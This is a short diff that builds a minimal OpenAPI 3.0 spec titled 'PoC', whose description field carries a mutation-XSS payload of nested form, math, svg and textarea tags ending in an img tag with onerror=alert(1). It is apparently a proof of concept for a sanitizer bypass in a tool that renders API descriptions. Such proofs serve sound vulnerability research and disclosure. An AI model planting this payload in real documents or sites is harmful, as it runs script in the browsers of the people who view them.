@@ -1,2 +1,7 @@
-description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea></textarea><img src=x onerror=alert(1)>
+openapi: "3.0.0"
+info:
+  title: "PoC"
+  version: "1.0"
+  description: |
+      <form><math><mtext></form><form><mglyph><svg><mtext><textarea></textarea><img src=x onerror=alert(1)>
+paths: {}
